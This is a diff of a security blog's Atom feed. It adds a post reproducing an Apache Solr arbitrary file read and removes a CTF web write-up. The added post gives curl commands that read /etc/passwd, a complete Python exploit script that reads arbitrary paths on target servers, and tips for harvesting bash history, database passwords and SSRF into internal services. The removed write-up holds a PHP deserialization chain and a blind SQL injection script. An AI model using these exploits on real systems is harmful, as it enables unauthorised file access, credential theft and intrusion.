@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://www.svenbeast.com</id>
     <title>攻城肾透shi | sv3nbeast</title>
-    <updated>2021-03-10T07:57:55.728Z</updated>
+    <updated>2021-03-18T13:50:44.806Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://www.svenbeast.com"/>
     <link rel="self" href="https://www.svenbeast.com/atom.xml"/>
@@ -10,6 +10,150 @@
     <logo>https://www.svenbeast.com/images/avatar.png</logo>
     <icon>https://www.svenbeast.com/favicon.ico</icon>
     <rights>All rights reserved 2021, 攻城肾透shi | sv3nbeast</rights>
+    <entry>
+        <title type="html"><![CDATA[Solr 文件读取复现附EXP及个人Tips]]></title>
+        <id>https://www.svenbeast.com/post/320hjX2MI/</id>
+        <link href="https://www.svenbeast.com/post/320hjX2MI/">
+        </link>
+        <updated>2021-03-18T13:43:11.000Z</updated>
+        <content type="html"><![CDATA[<p>下载<a href="https://mirrors.tuna.tsinghua.edu.cn/apache/lucene/solr/8.8.1/solr-8.8.1.zip">Solr</a></p>
+<pre><code>cd solr-8.8.1/bin
+./solr start -p 8989
+</code></pre>
+<p>然后add core</p>
+<pre><code>cd /solr-8.8.1/server/solr/
+mkdir newcore
+复制 /solr-8.8.1/server/solr/configsets/_default的conf文件夹进入刚才创建的newcore文件夹
+网页上点击Add Core
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://gitee.com/svenbeast/NotePicture/raw/master/img/2021/03/18/89329_image-20210318212131855.png" alt="image-20210318212131855" loading="lazy"></figure>
+<p>获得core名字</p>
+<pre><code>http://127.0.0.1:8989/solr/admin/cores?action=STATUS
+</code></pre>
+<p>打开 remote streaming</p>
+<pre><code>curl -d '{  &quot;set-property&quot; : {&quot;requestDispatcher.requestParsers.enableRemoteStreaming&quot;:true}}' http://127.0.0.1:8989/solr/newcore/config -H 'Content-type:application/json' 
+</code></pre>
+<p>进行文件读取</p>
+<pre><code>curl &quot;http://127.0.0.1:8989/solr/newcore/debug/dump?param=ContentStreams&quot; -F &quot;stream.url=file:////etc/passwd&quot; 
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://gitee.com/svenbeast/NotePicture/raw/master/img/2021/03/18/21567_image-20210318212947515.png" alt="image-20210318212947515" loading="lazy"></figure>
+<p>Exp : https://github.com/sv3nbeast/Solr-file_read</p>
+<figure data-type="image" tabindex="3"><img src="https://gitee.com/svenbeast/NotePicture/raw/master/img/2021/03/18/52513_image-20210318214215711.png" alt="image-20210318214215711" loading="lazy"></figure>
+<pre><code class="language-python">import requests
+import sys,re,json
+import threadpool
+#from requests.packages.urllib3.exceptions import InsecureRequestWarning
+requests.packages.urllib3.disable_warnings()
+
+banner = '''
+   _____       _        _____                _ 
+  / ____|     | |      |  __ \              | |
+ | (___   ___ | |_ __  | |__) |___  __ _  __| |
+  \___ \ / _ \| | '__| |  _  // _ \/ _` |/ _` |
+  ____) | (_) | | |    | | \ \  __/ (_| | (_| |
+ |_____/ \___/|_|_|    |_|  \_\___|\__,_|\__,_|
+                                               
+                            by 斯文            
+'''
+
+def exp(url):
+
+    try:
+        dbName = getDb(url)
+        
+        if dbName:
+
+            session = requests.Session()
+            rawBody = &quot;{  \&quot;set-property\&quot; : {\&quot;requestDispatcher.requestParsers.enableRemoteStreaming\&quot;:true}}&quot;
+            headers = {&quot;User-Agent&quot;:&quot;hack by sskkaayy&quot;,&quot;Connection&quot;:&quot;close&quot;,&quot;Content-type&quot;:&quot;application/json&quot;,&quot;Accept&quot;:&quot;*/*&quot;}
+            response = session.post(&quot;{}/solr/{}/config&quot;.format(url,dbName), data=rawBody, headers=headers)
+            
+            print(&quot;&gt;Core: {}&quot;.format(dbName))
+
+            while True:
+                linux = File(url,dbName)
+                try:
+                    print('&gt;result:\n')
+
+                    if 'Permission' in str(linux):
+                        print('Permission denied\n')
+                        continue
+                    if 'No such file or directory' in str(linux):
+                        print('No such file or directory\n')
+                        continue
+                    linux = json.loads(linux)
+                    if linux['streams']:
+                        print(linux['streams'][0]['stream'])
+                except:
+                    r = re.compile('''&lt;str name=&quot;stream&quot;&gt;(.*?)&lt;/str&gt;''')
+                    Str = re.findall(r,str(linux))
+                    res = Str[0].replace('\\n','\n')
+                    print(res + '\n')
+
+
+    except Exception as e:
+        print(e)
+        # print(&quot;Not vul&quot;)
+
+def File(url,dbName):
+
+    session = requests.Session()
+    paramsGet = {&quot;param&quot;:&quot;ContentStreams&quot;}
+    path = input(&quot;&gt;Path: &quot;)
+    paramsPost = {&quot;stream.url&quot;:&quot;file:///{}&quot;.format(path)}
+    headers = {&quot;User-Agent&quot;:&quot;hack by sskkaayy&quot;,&quot;Connection&quot;:&quot;close&quot;,&quot;Accept&quot;:&quot;*/*&quot;}
+    response = session.post(&quot;{}/solr/{}/debug/dump&quot;.format(url,dbName), data=paramsPost, params=paramsGet, headers=headers)
+
+    return response.content
+
+def getDb(url):
+
+    try:
+        target = url + '/solr/admin/cores?action=STATUS'
+        response = requests.get(target,verify=False,timeout=20)
+        data = response.text
+        if '关于全网部署360私有云的通知' in data:
+            print('[- 蜜罐烦死啦!')
+            return False
+
+        try:
+            r = re.compile('''&quot;status&quot;:{
+    &quot;(.*?)&quot;:{''')
+            Str = re.findall(r,str(data))
+            dbName = Str[0]
+        except:
+            r = re.compile('''&lt;str name=&quot;name&quot;&gt;(.*?)&lt;/str&gt;''')
+            Str = re.findall(r,str(data))
+            dbName = Str[0]
+
+    except Exception as e:
+        return False
+    return dbName
+
+if __name__ == &quot;__main__&quot;:
+    print(banner)
+    exp(sys.argv[1])
+
+</code></pre>
+<p>Tips</p>
+<pre><code># Solr 文件读取深度利用
+- 第一个
+{ 面板的-Djetty.home 路径}/solr/core名/conf/solrconfig.xml
+结果搜 &quot;config&quot; 获得文件名字
+- 第二个
+/home/用户名/.bash_history
+- 第三个
+/opt/solr/server/solr/configsets/_default/conf/solrconfig.xml
+结果搜 &quot;config&quot;  获得数据库账号密码
+- 第四个
+直接读目录可以把目录下的文件都显示出来，类似命令ls
+- 第五个
+此处支持SSRF，可考虑如何构造继续探测内网，比如redis
+</code></pre>
+<p>PS:</p>
+<p>老版本回显是xml格式，新版本是json格式，部分检测工具是没有覆盖全，我的POC没有这种问题</p>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[BypassAV的CS上线]]></title>
         <id>https://www.svenbeast.com/post/c5POOWPbA/</id>
@@ -1250,147 +1394,6 @@ BOOL WINAPI DllMain(
 <pre><code>https://payloads.online/archivers/2018-12-22/1
 https://mp.weixin.qq.com/s?__biz=MzU2NTc2MjAyNg==&amp;mid=2247483851&amp;idx=1&amp;sn=8813719d4d3ac8b20bec495fcd5f2974&amp;chksm=fcb7834ecbc00a58da8a6408abe183e71175b442d0f02016ad3c67c9cf719927881bec14af49#rd
 </code></pre>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[{N1CTF·2020·web·SignIn·writeup}]]></title>
-        <id>https://www.svenbeast.com/post/n1ctf2020websigninwriteup/</id>
-        <link href="https://www.svenbeast.com/post/n1ctf2020websigninwriteup/">
-        </link>
-        <updated>2020-10-19T06:44:22.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="开始">开始</h3>
-<p>访问地址直接给出了源码:  http://101.32.205.189</p>
-<pre><code>&lt;?php 
-class ip {
-    public $ip;
-    public function waf($info){
-    }
-    public function __construct() {
-        if(isset($_SERVER['HTTP_X_FORWARDED_FOR'])){
-            $this-&gt;ip = $this-&gt;waf($_SERVER['HTTP_X_FORWARDED_FOR']);
-        }else{
-            $this-&gt;ip =$_SERVER[&quot;REMOTE_ADDR&quot;];
-        }
-    }
-    public function __toString(){
-        $con=mysqli_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;********&quot;,&quot;n1ctf_websign&quot;);
-        $sqlquery=sprintf(&quot;INSERT into n1ip(`ip`,`time`) VALUES ('%s','%s')&quot;,$this-&gt;waf($_SERVER['HTTP_X_FORWARDED_FOR']),time());
-        if(!mysqli_query($con,$sqlquery)){
-            return mysqli_error($con);
-        }else{
-            return &quot;your ip looks ok!&quot;;
-        }
-        mysqli_close($con);
-    }
-}
-
-class flag {
-    public $ip;
-    public $check;
-    public function __construct($ip) {
-        $this-&gt;ip = $ip;
-    }
-    public function getflag(){
-    	if(md5($this-&gt;check)===md5(&quot;key****************&quot;)){
-    		readfile('/flag');
-    	}
-        return $this-&gt;ip;
-    }
-    public function __wakeup(){
-        if(stristr($this-&gt;ip, &quot;n1ctf&quot;)!==False)
-            $this-&gt;ip = &quot;welcome to n1ctf2020&quot;;
-        else
-            $this-&gt;ip = &quot;noip&quot;;
-    }
-    public function __destruct() {
-        echo $this-&gt;getflag();
-    }
-
-}
-if(isset($_GET['input'])){
-    $input = $_GET['input'];
-	unserialize($input);
-} 
-</code></pre>
-<p>粗略一看，源码里<code>unserialize($input)</code>的大字告诉我们是需要控制传入input参数的反序列化数据来进行一些条件的满足从而来获得flag</p>
-<pre><code>    public function getflag(){
-    	if(md5($this-&gt;check)===md5(&quot;key****************&quot;)){
-    		readfile('/flag');
-    	}
-        return $this-&gt;ip;
-    }
-</code></pre>
-<p>最终达成的目的很明显就是运行flag类里的<code>getflag()</code>方法，通过readfile来获得flag文件，而想要运行此方法就要满足条件<code>md5($this-&gt;check)===md5(&quot;key****************&quot;)</code>，并且key我们是不知道的，看起来也没有办法控制，可以控制的话还可以通过传入数组让两边md5函数来返回null来进行条件满足，所以我们<code>需要知道这个key的值</code></p>
-<pre><code>    public function __toString(){
-        $con=mysqli_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;********&quot;,&quot;n1ctf_websign&quot;);
-        $sqlquery=sprintf(&quot;INSERT into n1ip(`ip`,`time`) VALUES ('%s','%s')&quot;,$this-&gt;waf($_SERVER['HTTP_X_FORWARDED_FOR']),time());
-        if(!mysqli_query($con,$sqlquery)){
-            return mysqli_error($con);
-        }else{
-            return &quot;your ip looks ok!&quot;;
-        }
-        mysqli_close($con);
-    }
-</code></pre>
-<p>然后很自然的将目光投放到上面的ip类中，看到此类获取了访问者XFF并插入表中，很自然的就想到了<code>xff注入</code>，通过注入来获得key，来赋值<code>flag类中的check变量</code>，而此mysql语句放在<code>__toString()</code>中，想要运行此函数就要满足一个对象被当做字符串对待来触发,所以我们<code>需要寻找一个能够触发__toString()的点</code></p>
-<pre><code>    public function __wakeup(){
-        if(stristr($this-&gt;ip, &quot;n1ctf&quot;)!==False)
-            $this-&gt;ip = &quot;welcome to n1ctf2020&quot;;
-        else
-            $this-&gt;ip = &quot;noip&quot;;
-    }
-</code></pre>
-<p>分析一下发现，我们传入反序列化数据会触发<code>__wakeup()</code>,此处的<code>stristr()函数是对传入参数1中查找是否存在参数2</code>,而参数1也就是<code>$this-&gt;ip</code>是我们实例化flag时传入的字符串，属于可控参数，而当我们传入的是ip类实例化后的对象时，则刚好触发此ip类的__toString()函数，所以我们此时可以<code>生成序列化数据进行尝试</code></p>
-<pre><code>$flags = new flag(new ip());
-$b = serialize($flags);
-echo $b;
-</code></pre>
-<figure data-type="image" tabindex="1"><img src="https://www.svenbeast.com/post-images/1603092883974.png" alt="" loading="lazy"></figure>
-<pre><code>INSERT into admin(`username`,`password`) VALUES ('user' and updatexml(1,concat(0x02,(select database()),0x02),1) and '','123456')
-</code></pre>
-<p><img src="https://www.svenbeast.com/post-images/1603098143275.png" alt="" loading="lazy"><br>
-然后在本地mysql尝试构造了一个insert注入payload: <code>INSERT into admin(<code>username</code>,<code>password</code>) VALUES ('user' or if(1=1,sleep(3),1) or '','123456')</code>本地运行成功，访问目标时提示如图<br>
-<img src="https://www.svenbeast.com/post-images/1603098231154.png" alt="" loading="lazy"><br>
-存在注入检测，应该就是waf函数没显示的那些代码，所以无法直接进行注入，需要另想办法，而<code>__wakeup()</code>函数中有一个可以帮助盲注的点，触发__toString()时，我们可以通过报错函数来控制返回的字符串是否存在n1ctf，所以构造注入语句<code>1.1.1.1' or updatexml(1,concat(0x01,(select if((1=1),'n1ctf','no str')),0x01),1) or '</code><br>
-<img src="https://www.svenbeast.com/post-images/1603099096481.png" alt="" loading="lazy"><br>
-提示了welcome to n1ctf2020，那么只有在传入的值中包含n1ctf才会提示这个，所以很明显是传入的对象成功触发toString函数，证明思路是正确的，其中的报错函数导致sql语句报错，使return的返回值中包含了n1ctf，根据这个逻辑去写一个python脚本跑一下,我这里使用了一个很实用的burpsuite的插件辅助生成个模板<br>
-<img src="https://www.svenbeast.com/post-images/1603099255763.png" alt="" loading="lazy"></p>
-<h3 id="exp"><strong>exp</strong></h3>
-<pre><code>import requests
-
-session = requests.Session()
-
-x = 'qwertyuiopasdfghjklzxcvbnm1234567890'
-
-arr = []
-paramsGet = {&quot;input&quot;:&quot;O:4:\&quot;flag\&quot;:2:{s:2:\&quot;ip\&quot;;O:2:\&quot;ip\&quot;:1:{s:2:\&quot;ip\&quot;;s:9:\&quot;127.0.0.1\&quot;;}s:5:\&quot;check\&quot;;N;}&quot;}
-for start in range(1,30):
-    for result in x:
-        #获得表名为n1key
-        # get_tables = &quot;' or updatexml(1,concat(0x02,(select if((substring((select group_concat(table_name) from  information_schema.tables where table_schema='n1ctf_websign'),{},1)='{}'),'n1ctf','no str')),0x02),1) or '&quot;.format(start,result)
-        #获得列名
-        # get_column = &quot;' or updatexml(1,concat(0x02,(select if((substring((select group_concat(column_name) from information_schema.columns where table_name='n1key' and table_schema='n1ctf_websign'),{},1)='{}'),'n1ctf','no str')),0x02),1) or '&quot;.format(start,result)
-        #获得key值
-        get_key = &quot;' or updatexml(1,concat(0x02,(select if((substring((select `key` from n1key),{},1)='{}'),'n1ctf','no str')),0x02),1) or '&quot;.format(start,result)
-        
-        headers = {&quot;Cache-Control&quot;:&quot;no-cache&quot;,&quot;Accept&quot;:&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;,&quot;Upgrade-Insecure-Requests&quot;:&quot;1&quot;,&quot;User-Agent&quot;:&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36&quot;,&quot;Connection&quot;:&quot;close&quot;,&quot;X-Forwarded-for&quot;:&quot;1.1.1.1{}&quot;.format(get_key),&quot;Pragma&quot;:&quot;no-cache&quot;,&quot;Accept-Encoding&quot;:&quot;gzip, deflate&quot;,&quot;Accept-Language&quot;:&quot;zh-CN,zh;q=0.9,ar;q=0.8&quot;}
-        response = session.get(&quot;http://101.32.205.189/index.php&quot;, params=paramsGet, headers=headers)
-
-        if '&lt;code&gt;noip&lt;/code&gt;' not in str(response.content):
-            print('tables:'+result)
-            arr.append(result)
-for res in arr:
-    print(res,end=&quot;&quot;)
-</code></pre>
-<p><img src="https://www.svenbeast.com/post-images/1603101199981.png" alt="" loading="lazy"><br>
-获得了表名为n1ip, n1key，这里是因为源码里有数据库名为n1ctf_websign，所以可直接跑出表名<br>
-<img src="https://www.svenbeast.com/post-images/1603101738162.png" alt="" loading="lazy"><br>
-获得列名为id,key<br>
-<img src="https://www.svenbeast.com/post-images/1603102665903.png" alt="" loading="lazy"><br>
-获得key为n1ctf20205bf75ab0a30dfc0c<br>
-<img src="https://www.svenbeast.com/post-images/1603102892602.png" alt="" loading="lazy"><br>
-<img src="https://www.svenbeast.com/post-images/1603102783683.png" alt="" loading="lazy"><br>
-然后用这个key生成序列化数据进行访问，得到flag</p>
 ]]></content>
     </entry>
 </feed>
